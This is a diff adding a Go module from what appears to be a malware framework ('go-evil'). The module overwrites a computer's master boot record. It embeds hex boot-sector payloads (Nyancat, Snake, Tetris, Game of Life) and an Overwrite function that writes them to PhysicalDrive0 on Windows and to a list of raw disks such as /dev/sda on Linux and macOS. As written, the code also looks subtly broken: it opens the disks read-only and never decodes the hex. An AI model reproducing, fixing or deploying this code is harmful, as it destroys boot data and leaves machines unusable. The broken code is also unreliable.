@@ -1,0 +1,157 @@
+package mbr
+
+import (
+	"os"
+	"runtime"
+	"strings"
+
+	"github.com/s9rA16Bf4/go-evil/utility/io"
+	"github.com/s9rA16Bf4/notify_handler/go/notify"
+)
+
+type mbr_t struct {
+	mbr_content []string // The data that will be written
+}
+
+var c_mbr mbr_t
+
+func Load_content(new_line string) {
+	c_mbr.mbr_content = append(c_mbr.mbr_content, new_line)
+}
+
+func Load_binary_file(new_binary string) {
+	gut := io.Read_file(new_binary)
+	for _, line := range strings.Split(gut, "\n") {
+		Load_content(line)
+	}
+}
+
+func Load_Game_of_life() {
+	var content = `ea0500c00731c08ed031e40e1fb81300cd10b402ba0e0bcd10be4901bb01
+00b91000ac08c0740ab40ecd10b486cd15ebf1c70600008901b0b6e643fa
+36c70670009c01368c0e7200fb0e1fe8b600061fb800a08ec031c9be7301
+09c975ebe82700be00fa89f031d2bb4001f7f309c074123dc700740d09d2
+740981fa3f017403e81c004e75deebcf31f631ffbada03eca80875f8eca8
+0874fbb9007df3a5c31e56061f8a3c30db81ee4101ac08c07402fec3ac08
+c07402fec3ac08c07402fec381c63d01ac08c07402fec346ac08c07402fe
+c381c63d01ac08c07402fec3ac08c07402fec3ac08c07402fec35e1f80fb
+03740980fb02750808ff7404c60401c3c60400c3b800108ec0ad09c07501
+c389c589c7ad89c131d2ac88c3b70731c0d0e37302fec0aafec638ce7515
+fec238ea74d7b840015230f6f7e25a89ef01c730f608ff74d3fecfebd44c
+6f6164696e67203b2d29008bed08073044828b82443015f0050709718c14
+2041f10202f0e3f30202f03b33040f2594fa707af49520763905052e3182
+800000d8d8d8935dd8935dd8e4e4e4a75dd7935dd800505352561e0e1f8b
+360000fe0efc017545e461a803753731c0ac09c0750c4181ee1300c606fc
+0112eb2cd1e0d1e0d0e4d0e48826fc0130e489c3ba1200b8de34f7f3e642
+86e0e642e4610c03eb06fe06fc0124fce661893600001f5e5a5b58cf1200
+55aa`
+	for _, line := range content {
+		Load_content(string(line))
+	}
+}
+func Load_Nyancat() {
+	var content = `0e1f0e07fcb91400bfbb7d0f319631f0c1c607abe2f5b81300cd106800a0
+076a046a00bd800231ffb87e0031c949f3aa6800505fb1055701eff7dde8
+9c005f83c718e2f201ef681b7d5ee8a500e89f00585aa8017404f7ddf7d2
+f7dd40525029d7e88b00b105e84a00e2fb81c7b413e8a10083c714e89b00
+83c724e8950083c718e88f00b114bbbb7d8b3f5850c1e00429c731c081ff
+00e67708be9f7d53e812005b83c302e2e231c099b102b486cd15e973ff31
+dbac93ac92ad9283fa01740901d789dae80300ebefc3515789d9f3aa5f81
+c740014a75f359c351b1056a28586a185b6a0c5ae8e1ff0404e2f359c3e8
+0000ad01c731c0ac91ac93ac9992ac5752e8c6ff5a5f80ea0880c30881c7
+fc04e2edc35756e8d7ff5e5fc300fb034848000cf60248405910fb033838
+3c380f0428280010f103282019101904e228ec01000800e4041cf6010004
+0fe4f51cfb01000841dc042cf601000400d0e100f600f600f604f604fb04
+0000001cfb00f604f604fb0400000000000000dc13000004fb04fb04fb04
+fb04fb04fb00f6f4fa04f10100000002080c0008fb01080419040f000000
+00000000000cec04fb04000000f4f50000040004fb010000000000000000
+000000000000000000000000000000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000000000000
+55aa`
+	for _, line := range content {
+		Load_content(string(line))
+	}
+}
+func Load_Snake() {
+	var content = `ea057c000031c08ed8b8141131dbcd10b401b90020cd10be008066c7046f
+00311266c744046f00350c66c744086f00220266c7440c6f001f1366c744
+106f00051566c744144006280c66c744182306270c66c7441c2306260c66
+c744202a06250cfac7062400917cc70626000000c7062000b77cc7062200
+0000fbe85801ebfee4702480e670e47138c87604d0e8ebf8c360e4602c47
+3c09771788c2a2158066a1148088d48b1ed37c6689078306d37c04b020e6
+2061cf60a0fb7d08c07508e81300c606fb7d03fe0efb7db020e62061cf24
+8000a0e8fe00be00808a0408c00f84f200508b54028a4c0180f9000f84b9
+0080f901741680f904740980f9067408fec6eb0afecaeb06fec2eb02fece
+53bb00808b4f0209c9746a39d175618a0f80f9230f84c40080f96f75533c
+40754f8b3ed17c668b45fc8b4dfe80fc01740e80fc04740d80fc06740cfe
+cdeb0afec5eb06fec1eb02fec9c645fc2389c866c1e0108b45fcb02a6689
+058306d17c04b14fe80dff884702b118e805ff88470383c304eb8fbb00a0
+8b4f0209c9741c39d175138a4f0108c9740c884c01803c2a7504c6470100
+83c304ebdd5b5880fe18773a80fa4f7735b402cd1031db3c6f7504b304eb
+02b302b90100b409cd1089540283c604e906ffc36006b800b88ec031ffb8
+2002b9d007f3ab0761c3b800b88ec031ffb82044b9d007f3abebfe020000
+55aa`
+	for _, line := range content {
+		Load_content(string(line))
+	}
+}
+func Load_Tetris() {
+	var content = `ea057c000031db8ed3bc007c8edb8ec3fcbf0405b9b60131c0f3aab003cd
+10b526b003fec4cd10b800b88ec031ffb9d007b8000ff3abbe2a0566b8db
+dbdbdb668944fd89440183c61081feba0676f030d2be2405bfb87dfb8b1e
+6c0483c302391e6c0475fa84d27537fec2600f3131d031d203066c04b907
+00f7f189d3d0e38b9fe87dbf0405bedb00b9100030c0d1e30f42c6880547
+e2f461c7040600e9a500b401cd16745930e4cd168b1c80fc4b7506fe0cff
+d7724680fc4d7506fe04ffd7723b80fc48753831c9fec160061e07be0405
+b90400bf130501cfb204a483c703feca75f8e2efbe1405bf0405b108f3a5
+0761e2d7ffd77307b90300ebce891cfe4401ffd7733ffe4c0130d260061e
+07ba997de8870031c9be2a05b21030dbac84c00f44dafeca75f684db750b
+fd6089f783ee10f3a461fc83c11081f9900172da0761e9f1fe60bf3000be
+2a05b91000acaa47aa47e2f983c76081ffa00f72ed61608a4401b150f6e1
+0fb63cd1e783c71801c7d1e7b110be0405b40f84c97416fec9ac84c0260f
+4405ababf6c10375ec81c79000ebe661e9bffe0805c360e83500b11084c9
+7410fec9acffd247f6c10375f183c70cebec61c360f8bac27de8dcff61c3
+3cdb750e81ffba0673043a05750483c412f9c30fb64401c1e0040fb61c8d
+780601c7be0405c3000f200ee00260066003400e300653684e6f5867536f
+55aa`
+	for _, line := range content {
+		Load_content(string(line))
+	}
+}
+
+func Overwrite() {
+	switch runtime.GOOS {
+	case "windows":
+		target := "\\\\.\\PhysicalDrive0"
+		for len(c_mbr.mbr_content) < 512 { // Until it's a size of 512 bytes
+			c_mbr.mbr_content = append(c_mbr.mbr_content, "P")
+		}
+		in, err := os.Open(target)
+		if err != nil {
+			notify.Error(err.Error(), "MBR.Overwrite_MBR()")
+			return
+		}
+		bytes := make([]byte, len(c_mbr.mbr_content))
+		for _, line := range c_mbr.mbr_content {
+			bytes = append(bytes, []byte(line)...)
+		}
+		in.Write(bytes)
+
+	case "linux", "darwin":
+		for len(c_mbr.mbr_content) < 512 { // Until it's a size of 512 bytes
+			c_mbr.mbr_content = append(c_mbr.mbr_content, "P")
+		}
+		bytes := make([]byte, len(c_mbr.mbr_content))
+		for _, line := range c_mbr.mbr_content {
+			bytes = append(bytes, []byte(line)...)
+		}
+
+		targets := []string{"/dev/sda", "/dev/hda", "/dev/sdb", "/dev/hdb", "/dev/sdc", "/dev/hdc",
+			"/dev/sdd", "/dev/hdd", "/dev/sde", "/dev/hde", "/dev/sdf", "/dev/hdf", "/dev/sdg", "/dev/hdg"}
+
+		for _, target := range targets {
+			in, _ := os.Open(target)
+			in.Write(bytes)
+		}
+	}
+}
